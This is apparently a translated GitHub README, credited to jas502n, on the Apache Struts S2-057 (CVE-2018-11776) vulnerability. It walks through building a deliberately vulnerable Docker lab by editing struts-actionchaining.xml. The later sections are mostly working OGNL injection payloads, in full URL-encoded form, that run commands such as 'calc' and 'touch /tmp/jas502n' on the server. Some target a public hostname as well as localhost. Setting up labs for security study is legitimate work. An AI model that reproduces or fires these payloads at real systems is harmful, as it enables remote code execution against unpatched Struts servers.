# Credit to jas502n
```
Check Master for any updates and fixes. Translation purposes only. (I will try and update fixes)
```
Master https://github.com/jas502n/St2-057

# St2-057 Online Docking Environment, Enjoy!


# 0x01 Setting up the environment docker

https://github.com/surbo/vulhub/tree/master/struts2/s2-048

```
docker-compose up -d
```

# 0x02 Build a st2-057 vulnerability environment

```
docker exec -i -t 88fd8d560155 /bin/bash
```
Start in the background and enter docker

![](./docker-struts-048.jpg)


According to the announcement
https://struts.apache.org/releases.html

```
Release	Release Date	Vulnerability	Version Notes
Struts 2.5.16	16 March 2018	S2-057	Version notes
Struts 2.5.14.1	30 November 2017	Version notes
Struts 2.5.14	23 November 2017	S2-055, S2-054	Version notes
```
![](./in-st2-57.jpg)
There is a s2-057 vulnerability in Struts 2.5.16, then download this version.

https://fossies.org/linux/www/legacy/struts-2.5.16-all.zip/


```
apt-get update -y
mkdir /usr/local/tomcat/webapps/test
wget https://fossies.org/linux/www/legacy/struts-2.5.16-all.zip
apt-get install unzip -y
cp struts2-showcase.war /usr/local/tomcat/webapps/

```
![](./wget-st2-057.jpg)

# 0x03 Modifying the configuration file

First find the file struts-actionchaining.xml, and found that there are 2 need to modify
```
root@88fd8d560155:/usr/local/tomcat/webapps/test# locate struts-actionchaining.xml
/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml
/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml
/usr/local/tomcat/webapps/test/struts-2.5.16/src/apps/showcase/src/main/resources/struts-actionchaining.xml
root@88fd8d560155:/usr/local/tomcat/webapps/test# 

```
Profile modification - reference link:
https://lgtm.com/blog/apache_struts_CVE-2018-11776

Change to the following:

```
<struts>
    <package name="actionchaining" extends="struts-default">
        <action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.actionchain1">
           <result type="redirectAction">
             <param name = "actionName">register2</param>
           </result>
        </action>
    </package>
</struts>
```
![](./struts-actionchaining.jpg)

Then go to the bin directory, kill the process, because the configuration file is modified, so you need to restart the service.
```
root@88fd8d560155:/usr/local/tomcat/bin# cd /usr/local/tomcat/bin/
root@88fd8d560155:/usr/local/tomcat/bin# ls
bootstrap.jar	    catalina.sh			  commons-daemon.jar  daemon.sh  setclasspath.sh  startup.sh	   tool-wrapper.sh
catalina-tasks.xml  commons-daemon-native.tar.gz  configtest.sh       digest.sh  shutdown.sh	  tomcat-juli.jar  version.sh
root@88fd8d560155:/usr/local/tomcat/bin# ./shutdown.sh 

```
![](./down.jpg)

# 0x04 Restart the service, st2-057 is completed.
```
 ✘ ⚡ root@HK  ~/vulhub/struts2/s2-048   master ●  docker-compose up -d
Starting s2-048_struts2_1 ... done
 ⚡ root@HK  ~/vulhub/struts2/s2-048   master ●  
```
![](./start.jpg)
# 0x05 Verify st2-057
Docker target::http://www.canyouseeme.cc:8080/Struts2-showcase/

Command execution:http://www.canyouseeme.cc:8080/struts2-showcase/${(111+111)}/actionchain1.action

${(111+111)}

Get the execution result returned in the url::http://www.canyouseeme.cc:8080/Struts2-showcase/222/register2.action

![](./st2-57.jpg)

#### Ps: ${(111+111)} can be replaced with the previous poc, such as S2-032

http://www.canyouseeme.cc:8080/struts2-showcase/%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27calc%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew++java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b51020%5d%2c%23c.read(%23d)%2c%23jas502n%3d+%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23jas502n.println(%23d+)%2c%23jas502n.close())%7d/actionChain1.action

![](./calc.jpg)

poc-example:
```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new  java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),#jas502n.println(#d ),#jas502n.close())}
```
Split
```
${
(
#_memberAccess["allowStaticMethodAccess"]=true,
#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),
#b=new java.io.InputStreamReader(#a),
#c=new java.io.BufferedReader(#b),
#d=new char[51020],
#c.read(#d),
#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),
#jas502n.println(#d),
#jas502n.close())
}
```
# 0x06 Use the old version of the bomb calculator or command to execute
(Vulnerability environment: struts-2.2.3.1-all.zip)
download link: http://archive.apache.org/dist/struts/binaries/struts-2.2.3.1-all.zip

![](./struts-2.2.3.1.jpg)

Ps: The pit is a low version capable of playing the calculator, the high version cannot

Windows:

```
http://127.0.0.1:8080/struts3-showcase/%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec('calc').getInputStream()%2c%23b%3dnew%20java.io.InputStreamReader(%23a)%2c%23c%3dnew %20java.io.BufferedReader(%23b)%2c%23d%3dnew%20char%5b51020%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d/actionChain1.action
```
![](./windows.png)

Linux:

```
http://www.canyouseeme.cc/struts3-showcase/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27touch /tmp/jas502n%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action
```
![](./linux.png)

# 0x07 Reference link

```
https://github.com/vulhub/vulhub/tree/master/struts2/s2-048
https://lgtm.com/blog/apache_struts_CVE-2018-11776
https://cwiki.apache.org/confluence/display/WW/S2-057
https://www.anquanke.com/post/id/157518
```


